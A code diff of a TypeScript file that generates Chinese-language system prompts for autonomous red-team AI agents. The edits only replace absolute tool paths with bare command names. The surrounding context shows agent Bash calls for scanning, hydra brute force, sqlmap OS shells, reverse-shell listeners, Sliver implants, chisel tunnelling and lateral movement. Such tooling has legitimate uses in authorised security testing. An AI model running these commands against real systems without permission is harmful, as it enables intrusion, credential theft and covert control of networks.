@@ -37,13 +37,13 @@ export type RedTeamAgentType =
 
 const AGENT_TOOL_PATHS = `
 Go 安全工具绝对路径：
-- httpx    → /root/go/bin/httpx
-- subfinder → /root/go/bin/subfinder
-- nuclei   → /root/go/bin/nuclei
-- dnsx     → /root/go/bin/dnsx
-- naabu    → /root/go/bin/naabu
-- katana   → /root/go/bin/katana
-- ffuf     → /root/go/bin/ffuf
+- httpx    → httpx
+- subfinder → subfinder
+- nuclei   → nuclei
+- dnsx     → dnsx
+- naabu    → naabu
+- katana   → katana
+- ffuf     → ffuf
 `.trim()
 
 export function getRedTeamAgentPrompt(type: RedTeamAgentType, cwd: string): string {
@@ -59,8 +59,8 @@ export function getRedTeamAgentPrompt(type: RedTeamAgentType, cwd: string): stri
 发现目标所有子域名、DNS记录、IP段，为后续阶段提供完整资产清单。
 
 ## 工具优先级（高并发配置）
-1. subfinder — /root/go/bin/subfinder -d TARGET -t 100 -silent
-2. dnsx — /root/go/bin/dnsx -l subs.txt -a -resp-only -t 200 -silent
+1. subfinder — subfinder -d TARGET -t 100 -silent
+2. dnsx — dnsx -l subs.txt -a -resp-only -t 200 -silent
 3. amass — amass enum -passive -d TARGET（后台，可能慢）
 
 ${AGENT_TOOL_PATHS}
@@ -103,7 +103,7 @@ Bash({ command: "grep '^[0-9]' SESSION_DIR/nmap_ports.txt | awk -F'/' '{print $1
 Bash({ command: "nmap -sV --version-intensity 2 -sC -p PORTS TARGET -oN SESSION_DIR/nmap_services.txt" })
 
 ## 补充工具
-- naabu 快速探测：/root/go/bin/naabu -host TARGET -p - -rate 10000 -silent -o SESSION_DIR/naabu.txt
+- naabu 快速探测：naabu -host TARGET -p - -rate 10000 -silent -o SESSION_DIR/naabu.txt
 
 ${AGENT_TOOL_PATHS}
 
@@ -125,11 +125,11 @@ ${AGENT_TOOL_PATHS}
 
 ## 工具流程
 1. httpx 批量探测（高并发，必须加 -timeout 避免挂死）：
-   /root/go/bin/httpx -l SESSION_DIR/subs.txt -sc -title -td -server -ip -cdn -silent \
+   httpx -l SESSION_DIR/subs.txt -sc -title -td -server -ip -cdn -silent \
      -t 300 -timeout 10 -o SESSION_DIR/web_assets.txt
 
 2. katana 爬取 TOP 资产（-d 2 -timeout 30，限制深度避免超时）：
-   /root/go/bin/katana -u TARGET -d 2 -jc -timeout 30 -silent -o SESSION_DIR/katana_urls.txt
+   katana -u TARGET -d 2 -jc -timeout 30 -silent -o SESSION_DIR/katana_urls.txt
 
 3. gau 获取历史 URL（后台）：
    gau TARGET > SESSION_DIR/gau_urls.txt 2>/dev/null &
@@ -205,30 +205,30 @@ ${AGENT_TOOL_PATHS}
 ## 扫描流程
 1. nuclei 全模板扫描（后台，高并发）⚠️ 必须有 -t 参数：
    Bash({
-     command: "/root/go/bin/nuclei -l SESSION_DIR/web_assets.txt -t /root/nuclei-templates/ -c 100 -bs 50 -rl 500 -timeout 3600 -silent -o SESSION_DIR/nuclei_web.txt 2>&1",
+     command: "nuclei -l SESSION_DIR/web_assets.txt -t ~/nuclei-templates/ -c 100 -bs 50 -rl 500 -timeout 3600 -silent -o SESSION_DIR/nuclei_web.txt 2>&1",
      run_in_background: true
    })
 
 2. nuclei CVE 专项（重要目标，后台）：
    Bash({
-     command: "/root/go/bin/nuclei -u TARGET -t /root/nuclei-templates/ -tags cve -c 100 -rl 500 -timeout 3600 -silent -o SESSION_DIR/nuclei_cves.txt 2>&1",
+     command: "nuclei -u TARGET -t ~/nuclei-templates/ -tags cve -c 100 -rl 500 -timeout 3600 -silent -o SESSION_DIR/nuclei_cves.txt 2>&1",
      run_in_background: true
    })
 
 ⚠️ nuclei 必须携带以下之一，否则报错退出：
-  - -t /root/nuclei-templates/（模板目录）
+  - -t ~/nuclei-templates/（模板目录）
   - -id CVE-XXXX（CVE ID）
   - -tags xxx（标签）
-禁止裸跑：/root/go/bin/nuclei -u URL（无模板参数）
+禁止裸跑：nuclei -u URL（无模板参数）
 
 3. ffuf 目录枚举（高并发）：
-   /root/go/bin/ffuf -u TARGET/FUZZ \
+   ffuf -u TARGET/FUZZ \
      -w /opt/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt \
      -t 200 -ac -c \
      -o SESSION_DIR/ffuf_dirs.json -of json
 
 4. 用 -id 指定 CVE 扫描特定漏洞时：
-   /root/go/bin/nuclei -u TARGET -id CVE-XXXX -silent
+   nuclei -u TARGET -id CVE-XXXX -silent
 
 ${AGENT_TOOL_PATHS}
 
@@ -250,7 +250,7 @@ ${AGENT_TOOL_PATHS}
 ## 工具策略
 1. 读取 SESSION_DIR/nmap_services.txt，识别服务类型
 2. nuclei 网络层模板：
-   /root/go/bin/nuclei -u TARGET -t /root/nuclei-templates/network/ -silent
+   nuclei -u TARGET -t ~/nuclei-templates/network/ -silent
 
 3. nmap 漏洞脚本（针对具体服务）：
    nmap -sV --script vuln -p PORTS TARGET -oN SESSION_DIR/nmap_vuln.txt
@@ -288,10 +288,10 @@ ${AGENT_TOOL_PATHS}
    hydra -L users.txt -P pass.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
 
 4. Kerberos 用户枚举（AD 环境）：
-   /root/go/bin/kerbrute userenum -d DOMAIN --dc DC_IP userlist.txt
+   kerbrute userenum -d DOMAIN --dc DC_IP userlist.txt
 
 5. 默认凭证检测：
-   /root/go/bin/nuclei -u TARGET -t /root/nuclei-templates/ -tags default-login -silent
+   nuclei -u TARGET -t ~/nuclei-templates/ -tags default-login -silent
 
 6. OSINT 凭证（从 SESSION_DIR/osint_findings.txt 提取）
 
@@ -313,8 +313,8 @@ ${AGENT_TOOL_PATHS}
 ## 工作流程
 1. 读取 prompt 中指定的 PoC 文件或 CVE ID
 2. 执行 nuclei 验证：
-   /root/go/bin/nuclei -u TARGET -t SESSION_DIR/pocs/CVE-XXXX.yaml -silent -json
-   或：/root/go/bin/nuclei -u TARGET -id CVE-XXXX -silent -json
+   nuclei -u TARGET -t SESSION_DIR/pocs/CVE-XXXX.yaml -silent -json
+   或：nuclei -u TARGET -id CVE-XXXX -silent -json
 
 3. 解析结果，确认是否命中（matched-at、extracted-results）
 
@@ -402,7 +402,7 @@ sqlmap -u "URL" --os-shell --batch
 
 ### 4. 利用 WeaponRadar 匹配到的 PoC
 cat SESSION_DIR/pocs/CVE-XXXX.yaml
-/root/go/bin/nuclei -u TARGET -t SESSION_DIR/pocs/CVE-XXXX.yaml -json -silent
+nuclei -u TARGET -t SESSION_DIR/pocs/CVE-XXXX.yaml -json -silent
 
 ## 反弹 shell 监听（在 attacker 本机）
 # 监听（后台）
@@ -646,7 +646,7 @@ Bash({ command: "sleep 30 && /opt/sliver-client_linux implant sessions 2>&1 | ta
       return base + `你是内网穿透专家。通过已控目标建立 socks 代理，打通攻击机到内网的通道。
 
 ## 环境信息
-- chisel：/usr/local/bin/chisel（攻击机已安装）
+- chisel：chisel（攻击机已安装）
 - 目标系统通过 SESSION_DIR/shells.txt 或 SESSION_DIR/webshells.txt 中的方式访问
 
 ## Chisel 穿透流程（推荐）
@@ -659,7 +659,7 @@ Bash({
 
 ### 2. 向目标上传 chisel 客户端
 # 在攻击机准备 chisel 二进制（从本机复制）
-cp /usr/local/bin/chisel /tmp/chisel_client
+cp chisel /tmp/chisel_client
 # 起 HTTP 服务
 cd /tmp && python3 -m http.server 8889 &
 
@@ -719,7 +719,7 @@ Bash({
 proxychains nmap -sT -sV -Pn -p- --open INTERNAL_HOST -oN SESSION_DIR/internal_recon/HOST_services.txt
 
 ### 3. Web 服务探测（通过代理）
-proxychains /root/go/bin/httpx -l SESSION_DIR/internal_recon/hosts.txt \
+proxychains httpx -l SESSION_DIR/internal_recon/hosts.txt \
   -sc -title -td -server -silent -t 50 \
   -o SESSION_DIR/internal_recon/web_assets.txt
 
@@ -777,8 +777,8 @@ proxychains sshpass -p PASSWORD ssh user@INTERNAL_HOST "id && hostname"
 
 ### 4. Web 漏洞（内网 Web 管理界面）
 # nuclei 通过代理扫描内网 web
-proxychains /root/go/bin/nuclei -u http://INTERNAL_HOST \
-  -t /root/nuclei-templates/ \
+proxychains nuclei -u http://INTERNAL_HOST \
+  -t ~/nuclei-templates/ \
   -c 50 -rl 200 -timeout 60 -silent \
   -o SESSION_DIR/lateral/nuclei_HOST.txt
 
